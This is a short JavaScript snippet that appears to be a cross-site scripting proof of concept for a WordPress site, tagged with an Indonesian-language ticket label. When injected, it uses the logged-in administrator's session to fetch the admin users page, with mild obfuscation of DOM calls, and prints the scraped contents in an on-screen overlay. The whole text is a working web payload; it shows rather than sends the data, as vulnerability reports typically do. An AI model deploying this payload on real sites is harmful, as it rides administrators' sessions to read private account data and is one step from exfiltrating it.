(function () {
  var u = '/wp-admin/users.php';
  var x = new XMLHttpRequest();
  x.open('GET', u, false);
  x.send();
  var d = window['doc' + 'ument'];
  var p = d['cre' + 'ate' + 'Element']('pre');
  p.style = 'position:fixed;left:0;right:0;bottom:0;max-height:45vh;overflow:auto;background:#000;color:#0f0;z-index:999999;padding:10px;font-size:12px;white-space:pre-wrap';
  p.textContent = '[XSS-POC-TIKET-0877] GET ' + u + ' (dengan cookie sesi admin yang membuka dashboard) :: HTTP ' + x.status + ' :: ' + x.responseText.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').slice(0, 700);
  d.body.appendChild(p);
})();
